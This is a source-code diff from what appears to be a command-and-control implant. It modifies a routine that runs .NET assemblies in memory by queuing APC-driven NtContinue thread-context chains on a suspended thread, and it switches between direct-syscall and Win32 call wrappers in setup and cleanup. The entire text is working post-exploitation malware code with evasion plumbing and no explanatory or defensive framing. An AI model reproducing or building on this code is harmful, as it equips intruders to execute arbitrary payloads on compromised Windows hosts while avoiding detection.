@@ -199,7 +199,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
     if ( NT_SUCCESS( Instance.Win32.NtCreateEvent( &Instance.Dotnet->Event, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) &&
          NT_SUCCESS( Instance.Win32.NtCreateEvent( &Instance.Dotnet->Exit,  EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) )
     {
-        if ( NT_SUCCESS( Instance.Syscall.NtCreateThreadEx( &Instance.Dotnet->Thread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), Instance.Config.Implant.ThreadStartAddr, NULL, TRUE, 0, 0x10000 * 20, 0x10000 * 20, &ThreadAttr ) ) )
+        if ( NT_SUCCESS( Instance.Win32.NtCreateThreadEx( &Instance.Dotnet->Thread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), Instance.Config.Implant.ThreadStartAddr, NULL, TRUE, 0, 0x10000 * 20, 0x10000 * 20, &ThreadAttr ) ) )
         {
             Instance.Dotnet->RopInit = NtHeapAlloc( sizeof( CONTEXT ) );
             Instance.Dotnet->RopInvk = NtHeapAlloc( sizeof( CONTEXT ) );
@@ -207,7 +207,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
             Instance.Dotnet->RopExit = NtHeapAlloc( sizeof( CONTEXT ) );
 
             Instance.Dotnet->RopInit->ContextFlags = CONTEXT_FULL;
-            if ( NT_SUCCESS( Instance.Syscall.NtGetContextThread( Instance.Dotnet->Thread, Instance.Dotnet->RopInit ) ) )
+            if ( NT_SUCCESS( Instance.Win32.NtGetContextThread( Instance.Dotnet->Thread, Instance.Dotnet->RopInit ) ) )
             {
                 MemCopy( Instance.Dotnet->RopInvk, Instance.Dotnet->RopInit, sizeof( CONTEXT ) );
                 MemCopy( Instance.Dotnet->RopEvnt, Instance.Dotnet->RopInit, sizeof( CONTEXT ) );
@@ -221,7 +221,7 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
                 Instance.Dotnet->RopInvk->Rdx           = U_PTR( &Object );
                 Instance.Dotnet->RopInvk->R8            = U_PTR( Instance.Dotnet->MethodArgs );
                 Instance.Dotnet->RopInvk->R9            = U_PTR( &Instance.Dotnet->Return );
-                *( PVOID* )( Instance.Dotnet->RopInvk->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Syscall.NtTestAlert );
+                *( PVOID* )( Instance.Dotnet->RopInvk->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Win32.NtTestAlert );
 
                 // This rop tells the main thread (our agent main thread) that the assembly executable finished executing
                 Instance.Dotnet->RopEvnt->ContextFlags  = CONTEXT_FULL;
@@ -229,23 +229,23 @@ BOOL DotnetExecute( BUFFER Assembly, BUFFER Arguments )
                 Instance.Dotnet->RopEvnt->Rip           = U_PTR( Instance.Win32.NtSetEvent );
                 Instance.Dotnet->RopEvnt->Rcx           = U_PTR( Instance.Dotnet->Event );
                 Instance.Dotnet->RopEvnt->Rdx           = U_PTR( NULL );
-                *( PVOID* )( Instance.Dotnet->RopEvnt->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Syscall.NtTestAlert );
+                *( PVOID* )( Instance.Dotnet->RopEvnt->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Win32.NtTestAlert );
 
                 // Wait til we freed everything from the dotnet
                 Instance.Dotnet->RopExit->ContextFlags  = CONTEXT_FULL;
                 Instance.Dotnet->RopExit->Rsp          -= U_PTR( 0x1000 * 4 );
-                Instance.Dotnet->RopExit->Rip           = U_PTR( Instance.Syscall.NtWaitForSingleObject );
+                Instance.Dotnet->RopExit->Rip           = U_PTR( Instance.Win32.NtWaitForSingleObject );
                 Instance.Dotnet->RopExit->Rcx           = U_PTR( Instance.Dotnet->Exit );
                 Instance.Dotnet->RopExit->Rdx           = U_PTR( FALSE );
                 Instance.Dotnet->RopExit->R8            = U_PTR( NULL );
-                *( PVOID* )( Instance.Dotnet->RopExit->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Syscall.NtTestAlert );
+                *( PVOID* )( Instance.Dotnet->RopExit->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Win32.NtTestAlert );
 
-                if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( Instance.Dotnet->Thread, Instance.Syscall.NtContinue, Instance.Dotnet->RopInvk, FALSE, NULL ) ) ) goto Leave;
-                if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( Instance.Dotnet->Thread, Instance.Syscall.NtContinue, Instance.Dotnet->RopEvnt, FALSE, NULL ) ) ) goto Leave;
-                if ( ! NT_SUCCESS( Instance.Syscall.NtQueueApcThread( Instance.Dotnet->Thread, Instance.Syscall.NtContinue, Instance.Dotnet->RopExit, FALSE, NULL ) ) ) goto Leave;
+                if ( ! NT_SUCCESS( Instance.Win32.NtQueueApcThread( Instance.Dotnet->Thread, Instance.Win32.NtContinue, Instance.Dotnet->RopInvk, FALSE, NULL ) ) ) goto Leave;
+                if ( ! NT_SUCCESS( Instance.Win32.NtQueueApcThread( Instance.Dotnet->Thread, Instance.Win32.NtContinue, Instance.Dotnet->RopEvnt, FALSE, NULL ) ) ) goto Leave;
+                if ( ! NT_SUCCESS( Instance.Win32.NtQueueApcThread( Instance.Dotnet->Thread, Instance.Win32.NtContinue, Instance.Dotnet->RopExit, FALSE, NULL ) ) ) goto Leave;
 
                 PUTS( "Resume Thread..." )
-                if ( NT_SUCCESS( Instance.Syscall.NtAlertResumeThread( Instance.Dotnet->Thread, NULL ) ) )
+                if ( NT_SUCCESS( Instance.Win32.NtAlertResumeThread( Instance.Dotnet->Thread, NULL ) ) )
                 {
                     PUTS( "Apc started and assembly invoked." )
 
@@ -343,21 +343,19 @@ VOID DotnetClose()
     Instance.Win32.FreeConsole();
 #endif
 
-    PUTS( "Free Event" )
-    if ( Instance.Dotnet->Event )
-        Instance.Win32.NtClose( Instance.Dotnet->Event );
+    if ( Instance.Dotnet->Event ) {
+        SysNtClose( Instance.Dotnet->Event );
+    }
 
-    PUTS( "Free Pipe" )
-    if ( Instance.Dotnet->Pipe )
-        Instance.Win32.NtClose( Instance.Dotnet->Pipe );
+    if ( Instance.Dotnet->Pipe ) {
+        SysNtClose( Instance.Dotnet->Pipe );
+    }
 
-    PUTS( "Free File" )
-    if ( Instance.Dotnet->File )
-        Instance.Win32.NtClose( Instance.Dotnet->File );
+    if ( Instance.Dotnet->File ) {
+        SysNtClose( Instance.Dotnet->File );
+    }
 
-    PUTS( "Free Rops..." )
-    if ( Instance.Dotnet->RopInit )
-    {
+    if ( Instance.Dotnet->RopInit ) {
         MemSet( Instance.Dotnet->RopInit, 0, sizeof( CONTEXT ) );
         Instance.Win32.LocalFree( Instance.Dotnet->RopInit );
         Instance.Dotnet->RopInit = NULL;
@@ -441,20 +439,16 @@ VOID DotnetClose()
         Instance.Dotnet->MetaHost = NULL;
     }
 
-    PUTS( "Terminate and close thread" )
-    if ( Instance.Dotnet->Thread )
-    {
-        Instance.Syscall.NtTerminateThread( Instance.Dotnet->Thread, 0 );
-        Instance.Win32.NtClose( Instance.Dotnet->Thread );
+    if ( Instance.Dotnet->Thread ) {
+        SysNtTerminateThread( Instance.Dotnet->Thread, 0 );
+        SysNtClose( Instance.Dotnet->Thread );
     }
 
-    PUTS( "Free exit" )
-    if ( Instance.Dotnet->Exit )
-        Instance.Win32.NtClose( Instance.Dotnet->Exit );
+    if ( Instance.Dotnet->Exit ) {
+        SysNtClose( Instance.Dotnet->Exit );
+    }
 
-    PUTS( "Free Dotnet object" )
-    if ( Instance.Dotnet )
-    {
+    if ( Instance.Dotnet ) {
         MemSet( Instance.Dotnet, 0, sizeof( DOTNET_ARGS ) );
         NtHeapFree( Instance.Dotnet );
         Instance.Dotnet = NULL;
